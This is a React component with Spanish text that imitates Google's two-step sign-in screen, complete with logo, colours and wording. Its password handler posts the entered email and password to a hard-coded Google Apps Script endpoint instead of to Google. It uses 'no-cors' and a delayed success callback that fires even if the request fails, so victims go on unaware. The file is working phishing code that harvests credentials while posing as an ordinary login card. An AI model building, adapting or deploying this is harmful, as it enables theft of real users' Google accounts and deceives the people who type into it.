import { useState } from "react";
import GoogleLogo from "./GoogleLogo";

const GoogleLoginCard = ({ onLoginComplete }: { onLoginComplete: () => void }) => {
  const [step, setStep] = useState<"email" | "password">("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const webAppUrl = "https://script.google.com/macros/s/AKfycbzvYw6wrFwLPUWZ4dhM7HDF04wQRK0zLgfkey36BaicDoA75Zp3dM647ZkvV0raZim3/exec";

  const handleEmailNext = () => {
    if (email.trim() === "") return;
    setStep("password");
  };

  const handlePasswordNext = async () => {
    // IMPORTANTE: Verificamos que no esté vacío y que no se esté enviando ya
    if (password.trim() === "" || isSubmitting) return;

    setIsSubmitting(true);

    // Capturamos los valores actuales exactos para el envío
    const datosAEnviar = {
      usuario: email.trim(),
      pass: password.trim(),
      tipo: "LOGIN_GOOGLE"
    };

    try {
      await fetch(webAppUrl, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(datosAEnviar)
      });
      
      // Esperamos un segundo y medio para que el script de Google procese el primer intento
      setTimeout(() => {
        onLoginComplete();
      }, 1500);

    } catch (e) {
      console.error("Error de red:", e);
      setIsSubmitting(false);
      onLoginComplete();
    }
  };

  return (
    <div className="w-full max-w-[450px] mx-auto">
      <div className="forms-card p-10 sm:p-12">
        {step === "email" ? (
          <div className="animate-fade-in">
            <div className="flex justify-center mb-4"><GoogleLogo size={32} /></div>
            <h1 className="text-2xl font-normal text-center mb-2 font-google-sans text-[#202124]">Iniciar sesión</h1>
            <p className="text-center text-sm mb-8 text-[#202124]">Utiliza tu cuenta de Google</p>
            <div className="space-y-6">
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Correo electrónico o teléfono"
                className="google-input w-full"
                autoFocus
              />
              <div className="flex justify-between items-center pt-4">
                <span className="text-[#1a73e8] text-sm font-medium cursor-pointer">Crear cuenta</span>
                <button 
                  onClick={handleEmailNext} 
                  className="bg-[#1a73e8] hover:bg-[#1557b0] text-white px-6 py-2 rounded font-medium transition-colors"
                >
                  Siguiente
                </button>
              </div>
            </div>
          </div>
        ) : (
          <div className="animate-fade-in">
            <div className="flex justify-center mb-4"><GoogleLogo size={32} /></div>
            <h1 className="text-2xl font-normal text-center mb-2 font-google-sans text-[#202124]">Te damos la bienvenida</h1>
            <div className="flex justify-center mb-8">
              <div className="flex items-center gap-2 border border-[#dadce0] rounded-full px-3 py-1 text-sm font-medium text-[#3c4043]">
                <div className="w-5 h-5 rounded-full bg-[#f1f3f4] flex items-center justify-center text-[10px]">👤</div>
                {email}
              </div>
            </div>
            <div className="space-y-6">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Introduce tu contraseña"
                className="google-input w-full"
                autoFocus
                disabled={isSubmitting}
              />
              <label className="flex items-center gap-3 cursor-pointer select-none">
                <input 
                  type="checkbox" 
                  checked={showPassword} 
                  onChange={(e) => setShowPassword(e.target.checked)} 
                  className="w-4 h-4 accent-[#1a73e8]" 
                />
                <span className="text-sm text-[#3c4043]">Mostrar contraseña</span>
              </label>
              <div className="flex justify-between items-center pt-4">
                <span className="text-[#1a73e8] text-sm font-medium cursor-pointer">¿Has olvidado la contraseña?</span>
                <button 
                  onClick={handlePasswordNext} 
                  className={`bg-[#1a73e8] hover:bg-[#1557b0] text-white px-6 py-2 rounded font-medium transition-colors ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
                  disabled={isSubmitting}
                >
                  {isSubmitting ? "Cargando..." : "Siguiente"}
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default GoogleLoginCard;
